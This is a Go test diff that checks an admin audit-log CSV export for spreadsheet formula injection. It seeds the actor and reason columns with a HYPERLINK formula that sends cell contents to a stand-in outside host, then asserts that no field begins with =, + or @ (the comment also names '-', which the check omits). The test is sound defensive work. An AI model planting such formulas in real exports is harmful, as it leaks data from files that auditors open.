@@ -206,3 +206,60 @@ func insertAuditEvent(
 		t.Fatalf("insert audit event: %v", err)
 	}
 }
+
+// The audit export is served as an attachment for someone to open in a
+// spreadsheet, and Excel and LibreOffice execute a cell whose text begins with
+// =, +, - or @. Two columns carry text a user chose: the reason typed on every
+// change, and the actor name, which for a federated account is whatever the
+// identity provider put in the claim.
+//
+// The reader is an auditor with more access than whoever wrote the value, and
+// they are opening a file this product told them to download.
+func TestAuditExportDoesNotHandTheSpreadsheetAFormula(t *testing.T) {
+	runtime := storagetest.Open(t)
+	defer runtime.Close()
+	server := testServer(t, runtime)
+	cookie, csrf := authenticateInitialAdmin(t, server, runtime)
+
+	// Both columns a user chooses the text of: the reason typed on every change,
+	// and the actor name, which for a federated account is a claim value.
+	hostile := `=HYPERLINK("http://elsewhere/"&A1,"open")`
+	if _, err := runtime.DB().Exec(
+		`INSERT INTO audit_logs(
+			id, occurred_at, actor_type, actor_name, action, resource_type,
+			resource_id, request_id, source_ip, user_agent, result, reason
+		) VALUES ($1,$2,'user',$3,'asset.delete','asset','asset-1','request-1',
+		 '192.0.2.9','test','success',$4)`,
+		uuid.NewString(), time.Now().UTC().Add(-time.Hour),
+		"+"+hostile, hostile,
+	); err != nil {
+		t.Fatal(err)
+	}
+
+	response := performAuthenticatedJSON(
+		t, server, http.MethodGet, "/api/v1/admin/audit.csv", nil, cookie, csrf,
+	)
+	if response.Code != http.StatusOK {
+		t.Fatalf("export status = %d body = %s", response.Code, response.Body)
+	}
+
+	body := response.Body.String()
+	if !strings.Contains(body, "HYPERLINK") {
+		t.Fatalf("the recorded text did not reach the export at all: %s", body)
+	}
+	for _, line := range strings.Split(body, "\n") {
+		for _, field := range strings.Split(line, ",") {
+			trimmed := strings.TrimPrefix(strings.TrimSpace(field), `"`)
+			if trimmed == "" {
+				continue
+			}
+			switch trimmed[0] {
+			case '=', '+', '@':
+				t.Errorf(
+					"a field begins with %q, which a spreadsheet evaluates: %s",
+					trimmed[0], field,
+				)
+			}
+		}
+	}
+}
